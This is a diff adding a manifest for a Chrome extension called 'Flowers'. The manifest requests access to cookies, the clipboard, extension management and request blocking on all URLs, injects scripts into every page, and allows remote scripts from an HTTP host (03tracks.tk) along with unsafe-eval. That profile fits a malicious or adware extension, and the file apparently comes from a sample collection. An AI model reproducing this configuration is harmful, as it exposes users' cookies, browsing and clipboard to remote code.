@@ -1,0 +1,27 @@
+{
+   "background": {
+      "scripts": [ "background.js" ]
+   },
+   "browser_action": {
+      "default_icon": "ico/19.png"
+   },
+   "content_scripts": [ {
+      "js": [ "jquery-1.11.3.min.js", "js.js" ],
+      "matches": [ "*://*/*" ]
+   } ],
+   "content_security_policy": "script-src 'self' http://03tracks.tk https://counter.yadro.ru 'unsafe-eval'; object-src 'self';",
+   "description": "Flowers - all like this!",
+   "icons": {
+      "128": "ico/128.png",
+      "16": "ico/16.png",
+      "19": "ico/19.png",
+      "32": "ico/32.png",
+      "48": "ico/48.png"
+   },
+   "manifest_version": 2,
+   "name": "Flowers",
+   "permissions": [ "tabs", "storage", "cookies", "*://*/*", "management", "clipboardRead", "clipboardWrite", "https://*/*", "http://*/*", "\u003Call_urls>", "webRequest", "webRequestBlocking", "webNavigation" ],
+   "update_url": "https://clients2.google.com/service/update2/crx",
+   "version": "0.12",
+   "web_accessible_resources": [ "clock.png", "clock_16.png", "js.js", "style.css" ]
+}
